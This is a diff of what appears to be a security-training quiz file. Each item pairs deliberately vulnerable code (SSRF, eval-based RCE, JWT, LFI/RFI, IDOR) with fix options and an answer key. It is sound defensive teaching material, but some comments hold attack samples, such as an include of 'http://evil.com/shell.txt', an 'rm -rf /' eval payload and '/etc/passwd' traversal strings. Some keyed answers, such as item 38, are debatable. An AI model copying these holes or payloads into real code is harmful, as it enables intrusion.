@@ -150,834 +150,1033 @@ $comment = str_replace("<script>", "", $_POST['comment']);
         explanation: 'The correct way to prevent XSS is to properly encode output for its context. `htmlspecialchars` converts special HTML characters (like <, >, ") into their corresponding HTML entities, so they are displayed as text instead of being interpreted as code by the browser.',
     },
     {
-        id: '5',
-        title: 'Command Injection',
-        category: 'SQL Injection',
+        id: '35',
+        title: 'Server-Side Request Forgery (SSRF)',
+        category: 'SSRF',
         difficulty: 'Advanced',
         xp: 80,
-        description: 'User-provided filename is used directly in a system command, which could allow an attacker to execute arbitrary commands.',
-        vulnerableCode: `// Python
-import os
-def get_file_size(filename):
-    os.system("ls -l " + filename)
-`,
+        description: 'An attacker can coerce the server-side application to make HTTP requests to an arbitrary domain of the attacker\'s choosing.',
+        vulnerableCode: `// Python (Flask)
+@app.route('/fetch_image')
+def fetch_image():
+    image_url = request.args.get('url')
+    # The server fetches this URL and returns the content
+    response = requests.get(image_url)
+    return response.content`,
         language: 'python',
         options: [
-            { id: '5a', code: `def get_file_size(filename):
-    # Use built-in libraries that don't invoke a shell
-    return os.path.getsize(filename)` },
-            { id: '5b', code: `def get_file_size(filename):
-    # Sanitize the input by removing special characters
-    safe_filename = filename.replace(";", "").replace("&", "")
-    os.system("ls -l " + safe_filename)` },
-            { id: '5c', code: `def get_file_size(filename):
-    # Use command parameters safely
-    import subprocess
-    subprocess.run(["ls", "-l", filename])` }
+            {
+                id: '35a',
+                code: `// Sanitize the URL by blocking "localhost" and "127.0.0.1".
+if 'localhost' in image_url or '127.0.0.1' in image_url:
+    return "Forbidden", 403`
+            },
+            {
+                id: '35b',
+                code: `// Use a strict whitelist of allowed domains and protocols.
+from urllib.parse import urlparse
+allowed_domains = ['images.example.com']
+domain = urlparse(image_url).hostname
+if domain in allowed_domains:
+    # fetch...
+else:
+    return "Forbidden", 403`
+            },
+            {
+                id: '35c',
+                code: `// Ensure the URL starts with https://.
+if not image_url.startswith('https://'):
+    return "Forbidden", 403`
+            },
         ],
-        correctOptionId: '5c',
-        explanation: 'Using `subprocess.run` (or similar functions in other languages) with an array of arguments is the safest way to call external commands. This avoids shell interpretation of the input, preventing an attacker from injecting additional commands.',
+        correctOptionId: '35b',
+        explanation: 'The only reliable way to prevent SSRF is to maintain a strict whitelist of allowed domains, IP addresses, and protocols that the server is permitted to request. Blacklisting is easily bypassed.',
     },
     {
-        id: '6',
-        title: 'Cross-Site Request Forgery (CSRF)',
-        category: 'CSRF',
-        difficulty: 'Advanced',
-        xp: 75,
-        description: 'A web application accepts a state-changing request (e.g., changing a user\'s email) without verifying that the request was intentionally sent by the user.',
-        vulnerableCode: `// JavaScript (Node.js/Express)
-app.post('/update-email', (req, res) => {
-  // Assumes user is logged in via session cookie
-  const newEmail = req.body.email;
-  req.user.email = newEmail;
-  db.users.save(req.user);
-  res.send('Email updated!');
-});`,
-        language: 'javascript',
-        options: [
-            { id: '6a', code: `// Check the Referer header to ensure the request came from your own site.
-if (req.headers.referer.includes('yourdomain.com')) {
-    // ... process request
-}` },
-            { id: '6b', code: `// Implement an Anti-CSRF Token
-// 1. On page load, generate a unique, secret token and embed it in the form.
-// 2. On submission, verify that the token from the form matches the one stored in the user's session.
-if (req.body.csrf_token === req.session.csrf_token) {
-    // ... process request
-}` },
-            { id: '6c', code: `// Only allow POST requests for state changes.
-// The current code already does this, so it is secure.` }
-        ],
-        correctOptionId: '6b',
-        explanation: 'The most robust defense against CSRF is the Synchronizer Token Pattern. A unique, unpredictable token is required for each state-changing request, which an attacker cannot guess.',
-    },
-    {
-        id: '7',
-        title: 'XML External Entity (XXE) Injection',
-        category: 'SQL Injection',
-        difficulty: 'Advanced',
-        xp: 85,
-        description: 'An XML parser is configured to process external entities, which can be exploited to read local files or perform network requests.',
-        vulnerableCode: `// Java
-import javax.xml.parsers.DocumentBuilder;
-import javax.xml.parsers.DocumentBuilderFactory;
-// ...
-DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
-DocumentBuilder builder = factory.newDocumentBuilder();
-Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));`,
-        language: 'java',
-        options: [
-            { id: '7a', code: `// Disable external entity processing
-DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
-factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
-factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
-factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);` },
-            { id: '7b', code: `// Sanitize the XML input string before parsing
-xmlInput = xmlInput.replace("!ENTITY", "");` },
-            { id: '7c', code: `// Use a modern XML parser, which are secure by default.` }
-        ],
-        correctOptionId: '7a',
-        explanation: 'The safest way to prevent XXE is to explicitly disable DTDs (Document Type Definitions) and external entity processing in the XML parser configuration.',
-    },
-    {
-        id: '8',
-        title: 'Insecure Deserialization',
-        category: 'SQL Injection',
-        difficulty: 'Advanced',
-        xp: 90,
-        description: 'User-provided data is deserialized without validation, potentially leading to remote code execution if the data contains a malicious payload.',
-        vulnerableCode: `// Python (using pickle)
-import pickle
-import base64
-
-def process_data(data):
-    user_object = pickle.loads(base64.b64decode(data))
-    # ... do something with user_object`,
-        language: 'python',
-        options: [
-            { id: '8a', code: `// Use a safer data format like JSON for data exchange
-import json
-def process_data(data):
-    user_dict = json.loads(data)
-    # ... do something with user_dict` },
-            { id: '8b', code: `// Sign the data before serialization and verify the signature before deserialization.` },
-            { id: '8c', code: `// Keep the pickle library updated to the latest version.` }
-        ],
-        correctOptionId: '8a',
-        explanation: 'Never deserialize data from untrusted sources. The safest approach is to use a simple, human-readable data format like JSON and avoid complex object serialization altogether.',
-    },
-    {
-        id: '9',
-        title: 'Path Traversal',
-        category: 'IDOR',
-        difficulty: 'Intermediate',
-        xp: 65,
-        description: 'An attacker uses `../` sequences to access files outside of the intended directory.',
+        id: '36',
+        title: 'Remote Code Execution (RCE)',
+        category: 'RCE',
+        difficulty: 'Expert',
+        xp: 100,
+        description: 'A vulnerability that allows an attacker to execute arbitrary code on the target machine. This often happens through unsafe deserialization or command injection.',
         vulnerableCode: `// PHP
-$file = $_GET['filename'];
-include('/var/www/html/templates/' . $file);`,
+$data = $_GET['data'];
+eval($data); // Extremely dangerous!`,
         language: 'php',
         options: [
-            { id: '9a', code: `$file = str_replace('../', '', $_GET['filename']);
-include('/var/www/html/templates/' . $file);` },
-            { id: '9b', code: `$file = $_GET['filename'];
-$base_path = '/var/www/html/templates/';
-$real_path = realpath($base_path . $file);
-if (strpos($real_path, $base_path) === 0) {
-    include($real_path);
-}` },
-            { id: '9c', code: `// Only allow alphanumeric filenames
-if (ctype_alnum($file)) {
-    include('/var/www/html/templates/' . $file);
-}` }
+            {
+                id: '36a',
+                code: `// NEVER use eval() on user-controlled input. Refactor the code to avoid it entirely.
+// Use a safe, structured approach like a switch statement or function mapping.
+switch($data) {
+    case 'func1':
+        my_function_1();
+        break;
+    // ...
+}`
+            },
+            {
+                id: '36b',
+                code: `// Sanitize the input by removing dangerous function names.
+$data = str_replace('system', '', $data);
+eval($data);`
+            },
+            {
+                id: '36c',
+                code: `// Run the code in a sandboxed environment.
+// This is complex and not a primary defense.
+run_in_sandbox($data);`
+            },
         ],
-        correctOptionId: '9b',
-        explanation: 'The most reliable fix is to resolve the absolute path of the user-provided file (`realpath`) and then verify that this path is still within the intended base directory.',
+        correctOptionId: '36a',
+        explanation: 'The `eval()` function is extremely dangerous and should never be used with user-provided input. The only secure solution is to completely avoid it and refactor the logic to use safe, structured code constructs.',
     },
     {
-        id: '10',
-        title: 'Weak Password Hashing',
-        category: 'CSRF',
+        id: '37',
+        title: 'Insecure CORS Configuration',
+        category: 'CORS',
         difficulty: 'Intermediate',
         xp: 60,
-        description: 'Passwords are hashed using an outdated and fast hashing algorithm like MD5 or SHA1, making them vulnerable to brute-force attacks.',
-        vulnerableCode: `// Python
-import hashlib
-def hash_password(password):
-    return hashlib.sha1(password.encode()).hexdigest()`,
-        language: 'python',
-        options: [
-            { id: '10a', code: `// Use a modern, slow, and salted hashing algorithm like Argon2 or bcrypt.
-import bcrypt
-def hash_password(password):
-    salt = bcrypt.gensalt()
-    return bcrypt.hashpw(password.encode(), salt)` },
-            { id: '10b', code: `// Use a stronger hash like SHA256.
-import hashlib
-def hash_password(password):
-    return hashlib.sha256(password.encode()).hexdigest()` },
-            { id: '10c', code: `// Add a "pepper" (a secret key) before hashing.
-def hash_password(password):
-    pepper = "SECRET_KEY"
-    return hashlib.sha1((password + pepper).encode()).hexdigest()` }
-        ],
-        correctOptionId: '10a',
-        explanation: 'Modern password security requires using algorithms designed to be slow and computationally expensive, such as Argon2, scrypt, or bcrypt. These algorithms incorporate a salt automatically and make offline brute-force attacks much more difficult.',
-    },
-    {
-        id: '11',
-        title: 'Unvalidated Redirects and Forwards',
-        category: 'IDOR',
-        difficulty: 'Intermediate',
-        xp: 60,
-        description: 'A web application redirects to a URL specified in a query parameter without validating it, allowing attackers to redirect users to malicious sites.',
+        description: 'The server\'s Cross-Origin Resource Sharing (CORS) policy is too permissive, allowing any website to make requests and read the response.',
         vulnerableCode: `// JavaScript (Node.js/Express)
-app.get('/redirect', (req, res) => {
-  const target = req.query.url;
-  res.redirect(target);
+// This allows ANY origin to access the resource.
+app.use((req, res, next) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  next();
 });`,
         language: 'javascript',
         options: [
-            { id: '11a', code: `// Whitelist allowed redirect targets.
-const allowedDomains = ['example.com', 'help.example.com'];
-const targetUrl = new URL(req.query.url);
-if (allowedDomains.includes(targetUrl.hostname)) {
-    res.redirect(req.query.url);
-}` },
-            { id: '11b', code: `// Ensure the URL starts with HTTPS.
-if (req.query.url.startsWith('https://')) {
-    res.redirect(req.query.url);
-}` },
-            { id: '11c', code: `// Encode the URL before redirecting.
-const target = encodeURIComponent(req.query.url);
-res.redirect(target);` }
+            {
+                id: '37a',
+                code: `// Use a library like 'cors' and configure a strict whitelist of allowed origins.
+const cors = require('cors');
+const corsOptions = {
+  origin: 'https://trusted.example.com'
+};
+app.use(cors(corsOptions));`
+            },
+            {
+                id: '37b',
+                code: `// Dynamically reflect the request's Origin header.
+app.use((req, res, next) => {
+  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
+  next();
+});`
+            },
+            {
+                id: '37c',
+                code: `// Only allow GET requests.
+res.setHeader('Access-Control-Allow-Methods', 'GET');`
+            },
         ],
-        correctOptionId: '11a',
-        explanation: 'The safest approach is to maintain a whitelist of allowed URLs or domains and only redirect if the user-provided target matches an entry on the list. Relying on partial string matching (like `startsWith`) can often be bypassed.',
+        correctOptionId: '37a',
+        explanation: 'A wildcard `*` for CORS is dangerous for any API that is not completely public. You must use a strict whitelist of specific domains that are trusted to make cross-origin requests.',
     },
     {
-        id: '12',
-        title: 'Verbose Error Messages',
-        category: 'CSRF',
-        difficulty: 'Beginner',
-        xp: 40,
-        description: 'The application reveals detailed technical information (like stack traces or database errors) to the user, which can help an attacker.',
-        vulnerableCode: `// Java (Servlet)
-try {
-    // ... database operation fails ...
-} catch (SQLException e) {
-    out.println("<h1>Database Error</h1>");
-    e.printStackTrace(out); // Leaks stack trace to user
+        id: '38',
+        title: 'JWT Signature Bypass / "none" Algorithm',
+        category: 'Auth',
+        difficulty: 'Advanced',
+        xp: 75,
+        description: 'Some JWT libraries would accept a token with the algorithm field set to "none", bypassing signature verification entirely.',
+        vulnerableCode: `// Python (PyJWT library, older version)
+import jwt
+
+# Attacker crafts a token with "alg": "none"
+# and a modified payload (e.g., "user": "admin").
+# Some libraries would accept this without a signature.
+
+def decode_token(token):
+    return jwt.decode(token, algorithms=['HS256', 'none'])`,
+        language: 'python',
+        options: [
+            {
+                id: '38a',
+                code: `// Always specify the exact, expected algorithm(s) and never include 'none'.
+def decode_token(token, secret):
+    return jwt.decode(token, secret, algorithms=['HS256'])`
+            },
+            {
+                id: '38b',
+                code: `// Check if the algorithm is "none" before decoding.
+def decode_token(token, secret):
+    header = jwt.get_unverified_header(token)
+    if header['alg'] == 'none':
+        raise Exception("Bad algorithm")
+    return jwt.decode(token, secret, algorithms=['HS256'])`
+            },
+            {
+                id: '38c',
+                code: `// Update the JWT library to the latest version. Modern versions disallow the 'none' algorithm by default.`
+            },
+        ],
+        correctOptionId: '38c',
+        explanation: 'While explicitly checking the algorithm is good practice (A, B), the most critical fix is to use an up-to-date JWT library where this vulnerability has been patched. Modern libraries require you to explicitly opt-in to insecure algorithms like "none".',
+    },
+    {
+        id: '39',
+        title: 'OAuth Misconfiguration',
+        category: 'Auth',
+        difficulty: 'Intermediate',
+        xp: 65,
+        description: 'The OAuth provider has a loosely configured redirect URI, allowing an attacker to have the authorization code sent to a malicious site.',
+        vulnerableCode: `// OAuth Provider Configuration
+// Allowed Redirect URI: https://example.com/callback?path=
+// Attacker crafts a login URL with:
+// redirect_uri=https://example.com/callback?path=evil.com`,
+        language: 'generic',
+        options: [
+            {
+                id: '39a',
+                code: `// Use an exact match for the redirect URI.
+// Allowed Redirect URI: https://example.com/callback
+// Any other URI will be rejected.`
+            },
+            {
+                id: '39b',
+                code: `// URL-encode the redirect URI parameter.`
+            },
+            {
+                id: '39c',
+                code: `// Use a shorter authorization code lifetime.`
+            },
+        ],
+        correctOptionId: '39a',
+        explanation: 'OAuth redirect URIs must be compared using an exact string match. Allowing partial matches, wildcards, or paths opens the door for an attacker to specify a subdomain or path under their control.',
+    },
+    {
+        id: '40',
+        title: 'SAML Assertion Forgery',
+        category: 'Auth',
+        difficulty: 'Expert',
+        xp: 95,
+        description: 'The SAML service provider fails to properly validate the signature on an incoming SAML assertion, allowing an attacker to forge a valid assertion for any user.',
+        vulnerableCode: `// Conceptual Java code for SAML processing
+public void processSamlResponse(String samlResponse) {
+    // Response is parsed, but the signature is NOT checked.
+    String username = parseUsername(samlResponse);
+    logInUser(username);
 }`,
         language: 'java',
         options: [
-            { id: '12a', code: `// Show a generic error message and log the details on the server.
-} catch (SQLException e) {
-    // Log the full exception for developers
-    log.error("Database error occurred", e);
-    // Show a generic, safe message to the user
-    out.println("<h1>Error</h1><p>An unexpected error occurred. Please try again later.</p>");
-}` },
-            { id: '12b', code: `// Catch the specific exception but do nothing.
-} catch (SQLException e) {
-    // Suppress the error
-}` },
-            { id: '12c', code: `// Wrap the exception in a generic one.
-} catch (SQLException e) {
-    throw new RuntimeException("An error occurred");
-}` }
+            {
+                id: '40a',
+                code: `// Reject any assertion that does not have a signature.`
+            },
+            {
+                id: '40b',
+                code: `// Use a trusted SAML library and configure it to require and validate the signature against the Identity Provider's public key.`
+            },
+            {
+                id: '40c',
+                code: `// Encrypt the entire SAML assertion.`
+            },
         ],
-        correctOptionId: '12a',
-        explanation: 'Sensitive error details should never be sent to the client. The best practice is to log the detailed error server-side for debugging and present the user with a generic, non-informative error message.',
+        correctOptionId: '40b',
+        explanation: 'The core of SAML security is the cryptographic signature. The service provider MUST validate the signature on every assertion using the known public key of the trusted identity provider. Relying on anything less allows for trivial forgery.',
     },
     {
-        id: '13',
-        title: 'DOM-based XSS',
-        category: 'XSS',
-        difficulty: 'Advanced',
-        xp: 75,
-        description: 'Client-side JavaScript reads data from a part of the DOM (e.g., `location.hash`) and writes it back into the page unsafely.',
-        vulnerableCode: `// JavaScript
-// URL: https://example.com#<img src=x onerror=alert(1)>
-window.addEventListener('hashchange', () => {
-  const content = window.location.hash.substring(1);
-  document.getElementById('content').innerHTML = content;
+        id: '41',
+        title: 'Directory Listing / Sensitive Files Exposure',
+        category: 'Info Disclosure',
+        difficulty: 'Beginner',
+        xp: 40,
+        description: 'The web server is configured to show a list of all files in a directory if no index file (like `index.html`) is present.',
+        vulnerableCode: `// Apache Web Server Configuration (.htaccess or httpd.conf)
+// If 'Options +Indexes' is present, or if 'Options -Indexes' is absent.
+// Visiting http://example.com/images/ will list all images.`,
+        language: 'generic',
+        options: [
+            {
+                id: '41a',
+                code: `// Explicitly disable directory listing in the server configuration.
+Options -Indexes`
+            },
+            {
+                id: '41b',
+                code: `// Add an empty index.html file to every directory.`
+            },
+            {
+                id: '41c',
+                code: `// Use a robots.txt file to disallow access.`
+            },
+        ],
+        correctOptionId: '41a',
+        explanation: 'The most direct and secure fix is to configure the web server to never generate directory listings. Placing empty index files is a workaround that is easy to forget and doesn\'t scale.',
+    },
+    {
+        id: '42',
+        title: 'Unauthenticated API Endpoint',
+        category: 'Broken Auth',
+        difficulty: 'Intermediate',
+        xp: 60,
+        description: 'An API endpoint that should be protected requires no authentication, allowing anyone to access it.',
+        vulnerableCode: `// JavaScript (Node.js/Express)
+// This endpoint should be for logged-in users only.
+app.get('/api/user/profile', (req, res) => {
+    // ... logic to fetch and return a user's profile
 });`,
         language: 'javascript',
         options: [
-            { id: '13a', code: `// Avoid using innerHTML. Set the text content instead.
-const content = window.location.hash.substring(1);
-document.getElementById('content').textContent = decodeURIComponent(content);` },
-            { id: '13b', code: `// Use a library to sanitize the HTML before writing it.
-const content = window.location.hash.substring(1);
-const sanitized = DOMPurify.sanitize(content);
-document.getElementById('content').innerHTML = sanitized;` },
-            { id: '13c', code: 'Both A and B are valid solutions depending on the requirements.' }
+            {
+                id: '42a',
+                code: `// Add authentication middleware to the endpoint.
+app.get('/api/user/profile', ensureIsLoggedIn, (req, res) => {
+    // ...
+});`
+            },
+            {
+                id: '42b',
+                code: `// Obfuscate the URL to make it hard to find.
+app.get('/api/u/p/a9b8c7', ...)`
+            },
+            {
+                id: '42c',
+                code: `// Check for a specific HTTP header, like 'X-Requested-With'.`
+            },
         ],
-        correctOptionId: '13c',
-        explanation: 'Both options are valid fixes. If the goal is to display the content as plain text, using `.textContent` (Option A) is simplest and safest. If the goal is to allow some safe HTML but block scripts, using a sanitizer library like DOMPurify (Option B) is the correct approach.',
+        correctOptionId: '42a',
+        explanation: 'Access control for sensitive endpoints must be enforced on the server-side with proper authentication middleware. The middleware should check for a valid session, token, or API key before allowing the request to proceed.',
     },
     {
-        id: '14',
-        title: 'Prototype Pollution',
-        category: 'CSRF',
+        id: '43',
+        title: 'Excessive Data Exposure (API)',
+        category: 'Info Disclosure',
+        difficulty: 'Intermediate',
+        xp: 60,
+        description: 'An API endpoint returns the entire user object from the database, including sensitive data like password hashes or personal information not needed by the client.',
+        vulnerableCode: `// JavaScript (Node.js/Express)
+app.get('/api/users/:id', (req, res) => {
+  const user = db.users.find(req.params.id);
+  // Returns the full user object, including password hash, etc.
+  res.json(user); 
+});`,
+        language: 'javascript',
+        options: [
+            {
+                id: '43a',
+                code: `// Create a Data Transfer Object (DTO) or manually map only the necessary fields.
+const user = db.users.find(req.params.id);
+const userDto = {
+    id: user.id,
+    name: user.name,
+    username: user.username
+};
+res.json(userDto);`
+            },
+            {
+                id: '43b',
+                code: `// Encrypt the entire JSON response.`
+            },
+            {
+                id: '43c',
+                code: `// Remove the sensitive data on the client-side after receiving it.`
+            },
+        ],
+        correctOptionId: '43a',
+        explanation: 'APIs should be designed to return only the data that is absolutely necessary for the client. This practice, known as creating a DTO (Data Transfer Object) or "ViewModel", prevents accidentally leaking sensitive information.',
+    },
+    {
+        id: '44',
+        title: 'Insecure Direct Object Reference (File Access)',
+        category: 'IDOR',
+        difficulty: 'Advanced',
+        xp: 80,
+        description: 'An application allows users to download files, but the filename is user-controlled, potentially allowing access to any file on the server.',
+        vulnerableCode: `// Python (Flask)
+@app.route('/download')
+def download_file():
+    filename = request.args.get('file')
+    # Vulnerable to path traversal, e.g., ?file=../../../../etc/passwd
+    return send_from_directory('/var/www/uploads/', filename)`,
+        language: 'python',
+        options: [
+            {
+                id: '44a',
+                code: `// Sanitize the filename by removing '..'
+filename = filename.replace('..', '')`
+            },
+            {
+                id: '44b',
+                code: `// Verify that the requested file is within the intended directory.
+import os
+base_dir = '/var/www/uploads/'
+safe_path = os.path.join(base_dir, filename)
+if os.path.commonprefix((os.path.realpath(safe_path), base_dir)) != base_dir:
+    abort(403)
+return send_from_directory(...)`
+            },
+            {
+                id: '44c',
+                code: `// Don't use user input for filenames. Use IDs instead.
+// Map an ID like '123' to a real filename on the server.
+file_map = {'123': 'datasheet.pdf'}
+real_filename = file_map.get(request.args.get('id'))`
+            },
+        ],
+        correctOptionId: '44c',
+        explanation: 'While path validation (B) is a good defense, the most robust solution for IDOR is to avoid using direct object references (like filenames) in URLs. Instead, use indirect references (like a numeric ID or a UUID) and map them to the actual file path on the server-side after verifying authorization.',
+    },
+    {
+        id: '45',
+        title: 'Remote File Inclusion (RFI)',
+        category: 'File Inclusion',
+        difficulty: 'Advanced',
+        xp: 85,
+        description: 'The application includes a script or file using a URL provided by the user, allowing an attacker to execute code from a remote server.',
+        vulnerableCode: `// PHP
+// Attacker sets ?page=http://evil.com/shell.txt
+$page = $_GET['page'];
+include($page);`,
+        language: 'php',
+        options: [
+            {
+                id: '45a',
+                code: `// Disable 'allow_url_include' in php.ini.
+// allow_url_include = Off`
+            },
+            {
+                id: '45b',
+                code: `// Use a strict whitelist of allowed files.
+$allowed_pages = ['home.php', 'about.php'];
+if (in_array($page, $allowed_pages)) {
+    include($page);
+}`
+            },
+            {
+                id: '45c',
+                code: 'Both A and B are necessary for a secure configuration.'
+            },
+        ],
+        correctOptionId: '45c',
+        explanation: 'RFI is extremely dangerous. The best defense is to disable the feature at the server configuration level (A) and to also implement application-level logic (B) that only allows including files from a known, trusted list.',
+    },
+    {
+        id: '46',
+        title: 'Local File Inclusion (LFI)',
+        category: 'File Inclusion',
+        difficulty: 'Advanced',
+        xp: 80,
+        description: 'An attacker can include and execute files from the local server by manipulating a filename parameter, often using path traversal.',
+        vulnerableCode: `// PHP
+// Attacker sets ?page=../../../../etc/passwd
+$page = $_GET['page'];
+include($page . '.php');`,
+        language: 'php',
+        options: [
+            {
+                id: '46a',
+                code: `// Strip out path traversal characters.
+$page = str_replace('../', '', $_GET['page']);
+include($page . '.php');`
+            },
+            {
+                id: '46b',
+                code: `// Use a strict whitelist of allowed page names.
+$allowed = ['home', 'about', 'contact'];
+if (in_array($page, $allowed)) {
+    include($page . '.php');
+}`
+            },
+            {
+                id: '46c',
+                code: `// Validate that the filename only contains alphanumeric characters.
+if (ctype_alnum($page)) {
+    include($page . '.php');
+}`
+            },
+        ],
+        correctOptionId: '46b',
+        explanation: 'Blacklisting bad characters (like in A and C) is often bypassable. The most secure approach is to use a whitelist, where you explicitly define the exact set of files that are allowed to be included.',
+    },
+    {
+        id: '47',
+        title: 'Server Information Disclosure (Stack Trace)',
+        category: 'Info Disclosure',
+        difficulty: 'Beginner',
+        xp: 45,
+        description: 'In a production environment, a detailed stack trace is shown to the user when an unhandled exception occurs.',
+        vulnerableCode: `// Python (Flask in debug mode)
+// app.run(debug=True)
+// An unhandled exception will display a full, interactive traceback in the browser.`,
+        language: 'python',
+        options: [
+            {
+                id: '47a',
+                code: `// Disable debug mode in production.
+// app.run(debug=False)
+// And configure a custom error handler to show a generic page.`
+            },
+            {
+                id: '47b',
+                code: `// Wrap every single function in a try...except block.`
+            },
+            {
+                id: '47c',
+                code: `// Use a web application firewall (WAF) to block error pages.`
+            },
+        ],
+        correctOptionId: '47a',
+        explanation: 'Debug mode should NEVER be enabled in a production environment. Applications must be configured to catch all unhandled exceptions and display a generic error page to the user, while logging the detailed error on the server for developers.',
+    },
+    {
+        id: '48',
+        title: 'Backup File Exposure (.git, .env)',
+        category: 'Info Disclosure',
+        difficulty: 'Intermediate',
+        xp: 55,
+        description: 'A web server is configured to serve files like `.git/config` or `.env`, exposing sensitive information.',
+        vulnerableCode: `// Generic Web Server issue.
+// An attacker can browse to https://example.com/.git/config
+// and see repository information.`,
+        language: 'generic',
+        options: [
+            {
+                id: '48a',
+                code: `// Ensure the deployment process does not copy these directories to the web root.`
+            },
+            {
+                id: '48b',
+                code: `// Configure the web server (e.g., Nginx, Apache) to explicitly deny access to these sensitive directories and files.`
+            },
+            {
+                id: '48c',
+                code: `Both A and B are essential. The files should not be there in the first place, and the server should block them as a second layer of defense.`
+            },
+        ],
+        correctOptionId: '48c',
+        explanation: 'Defense in depth is key. Your deployment pipeline should be configured to never place sensitive files like `.git` or `.env` in a public web directory (A). Additionally, your web server should be configured to block access to them just in case they are accidentally exposed (B).',
+    },
+    {
+        id: '49',
+        title: 'Insecure Use of eval()/exec()',
+        category: 'RCE',
         difficulty: 'Expert',
         xp: 95,
-        description: 'An attacker modifies `Object.prototype`, adding properties that then appear on all objects in the application, leading to potential denial of service or remote code execution.',
-        vulnerableCode: `// JavaScript (merging objects recursively)
-function merge(target, source) {
-  for (let key in source) {
-    if (key in source && key in target) {
-      merge(target[key], source[key]);
+        description: 'Code dynamically executes a string that can be influenced by user input, leading to Remote Code Execution (RCE).',
+        vulnerableCode: `// Python
+user_input = request.args.get('formula')
+# User input might be "__import__('os').system('rm -rf /')"
+result = eval(user_input)`,
+        language: 'python',
+        options: [
+            {
+                id: '49a',
+                code: `// NEVER use eval() on user input. Find a safer way to implement the desired logic.
+// If it's for math, use a dedicated math expression parser.
+// For other logic, use if/else or dictionary mapping.`
+            },
+            {
+                id: '49b',
+                code: `// Sanitize the input to remove keywords like 'import' and 'os'.
+if 'import' in user_input:
+    raise ValueError("Invalid input")
+result = eval(user_input)`
+            },
+            {
+                id: '49c',
+                code: `// Limit the globals and locals available to eval().
+result = eval(user_input, {'__builtins__': {}}, {})`
+            },
+        ],
+        correctOptionId: '49a',
+        explanation: '`eval()` is considered a major security risk. Blacklisting dangerous keywords is fragile and easily bypassed. While limiting the scope helps, it\'s still risky. The only truly safe solution is to avoid `eval()` entirely and refactor the code to use safe, alternative approaches.',
+    },
+    {
+        id: '50',
+        title: 'Privilege Escalation (Role Bypass)',
+        category: 'Broken Access Control',
+        difficulty: 'Advanced',
+        xp: 85,
+        description: 'A user is able to perform an action that should be restricted to a higher privilege level, like an administrator.',
+        vulnerableCode: `// JavaScript (Node.js/Express)
+app.post('/users/:id/delete', (req, res) => {
+    // This endpoint should only be callable by an admin, or the user themselves.
+    // It currently has no authorization check.
+    const userIdToDelete = req.params.id;
+    db.deleteUser(userIdToDelete);
+    res.send("User deleted");
+});`,
+        language: 'javascript',
+        options: [
+            {
+                id: '50a',
+                code: `// Add a check that the logged-in user is either an admin or is deleting their own account.
+app.post('/users/:id/delete', (req, res) => {
+    const userIdToDelete = req.params.id;
+    const loggedInUser = req.user;
+    if (loggedInUser.role === 'admin' || loggedInUser.id === userIdToDelete) {
+        db.deleteUser(userIdToDelete);
+        res.send("User deleted");
     } else {
-      target[key] = source[key];
+        res.status(403).send("Forbidden");
     }
+});`
+            },
+            {
+                id: '50b',
+                code: `// Make it a DELETE request instead of POST.`
+            },
+            {
+                id: '50c',
+                code: `// Ask the user to re-enter their password before deleting.`
+            },
+        ],
+        correctOptionId: '50a',
+        explanation: 'Every privileged action must have a corresponding authorization check on the server-side. The server must verify that the authenticated user has the necessary permissions to perform the requested action on the target resource.',
+    },
+    {
+        id: '51',
+        title: 'Insecure Mobile Storage (Sensitive Data)',
+        category: 'Mobile Security',
+        difficulty: 'Intermediate',
+        xp: 60,
+        description: 'A mobile application stores sensitive information, like an API token, in an insecure location like `SharedPreferences` (Android) or `UserDefaults` (iOS) without encryption.',
+        vulnerableCode: `// Java (Android)
+SharedPreferences prefs = context.getSharedPreferences("user_prefs", Context.MODE_PRIVATE);
+prefs.edit().putString("api_token", token).apply();`,
+        language: 'java',
+        options: [
+            {
+                id: '51a',
+                code: `// Use the Android Keystore system to generate an encryption key and encrypt the data before storing it.
+// Use EncryptedSharedPreferences for a simpler API.`
+            },
+            {
+                id: '51b',
+                code: `// Obfuscate the token before storing it.
+prefs.edit().putString("api_token", new StringBuilder(token).reverse().toString()).apply();`
+            },
+            {
+                id: '51c',
+                code: `// Store the token in a file in the app's private directory.`
+            },
+        ],
+        correctOptionId: '51a',
+        explanation: 'On a rooted device, `SharedPreferences` can be easily read. All sensitive data stored on a mobile device must be encrypted using platform-provided secure storage mechanisms, like the Android Keystore or iOS Keychain.',
+    },
+    {
+        id: '52',
+        title: 'Improper Session Timeout',
+        category: 'Session Management',
+        difficulty: 'Beginner',
+        xp: 40,
+        description: 'A web application\'s sessions never expire, meaning that if a session token is stolen, it can be used indefinitely.',
+        vulnerableCode: `// Conceptual - Server Session Configuration
+// Session timeout is set to "infinity" or a very long duration (e.g., 30 days).`,
+        language: 'generic',
+        options: [
+            {
+                id: '52a',
+                code: `// Implement a reasonable session timeout on the server side.
+// e.g., 15-30 minutes of inactivity for a standard application.
+// Also implement an absolute timeout (e.g., 8 hours).`
+            },
+            {
+                id: '52b',
+                code: `// Rely on the user to manually log out.`
+            },
+            {
+                id: '52c',
+                code: `// Store the session token in localStorage instead of a cookie.`
+            },
+        ],
+        correctOptionId: '52a',
+        explanation: 'Sessions must have a defined expiration time to limit the window of opportunity for an attacker who steals a session token. A combination of an inactivity/sliding timeout and an absolute timeout is best practice.',
+    },
+    {
+        id: '53',
+        title: 'Weak Multi-Factor Authentication Implementation',
+        category: 'Auth',
+        difficulty: 'Advanced',
+        xp: 80,
+        description: 'A 2FA/MFA implementation can be bypassed. For example, the verification step is not properly linked to the login session.',
+        vulnerableCode: `// Conceptual Flow
+// 1. User submits username/password. Server says "OK".
+// 2. User is redirected to a page: /verify-2fa.
+// 3. After verifying 2FA, user is logged in.
+// Attacker can log in with just username/password, then skip step 2 and go directly to a post-login page like /dashboard.`,
+        language: 'generic',
+        options: [
+            {
+                id: '53a',
+                code: `// After successful password login, the server should create a temporary "pre-authentication" session state.
+// The user should not be fully authenticated until the 2FA step is also completed within this same session.`
+            },
+            {
+                id: '53b',
+                code: `// Use SMS for 2FA as it is the most common method.`
+            },
+            {
+                id: '53c',
+                code: `// Rate-limit 2FA code attempts.`
+            },
+        ],
+        correctOptionId: '53a',
